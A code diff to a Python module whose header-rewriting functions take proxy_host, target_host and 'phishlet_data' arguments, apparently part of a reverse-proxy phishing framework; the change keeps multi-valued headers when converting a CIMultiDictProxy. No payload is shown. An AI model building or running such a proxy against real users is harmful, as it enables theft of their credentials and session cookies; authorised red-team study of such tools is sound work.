@@ -6,8 +6,14 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
     # print(f"commin headers: {headers}")
     # Convert CIMultiDictProxy to regular dict if needed
     if hasattr(headers, 'getall'):
-        # It's a CIMultiDictProxy, convert to regular dict
-        headers_dict = dict(headers)
+        # It's a CIMultiDictProxy, convert to regular dict while preserving multiple values
+        headers_dict = {}
+        for key in headers:
+            values = headers.getall(key)
+            if len(values) == 1:
+                headers_dict[key] = values[0]
+            else:
+                headers_dict[key] = values
     else:
         # It's already a regular dict
         headers_dict = headers.copy()
@@ -239,8 +245,14 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
 def patch_headers_in(headers, proxy_host, target_host):
     # Convert CIMultiDictProxy to regular dict if needed
     if hasattr(headers, 'getall'):
-        # It's a CIMultiDictProxy, convert to regular dict
-        headers_dict = dict(headers)
+        # It's a CIMultiDictProxy, convert to regular dict while preserving multiple values
+        headers_dict = {}
+        for key in headers:
+            values = headers.getall(key)
+            if len(values) == 1:
+                headers_dict[key] = values[0]
+            else:
+                headers_dict[key] = values
     else:
         # It's already a regular dict
         headers_dict = headers.copy()
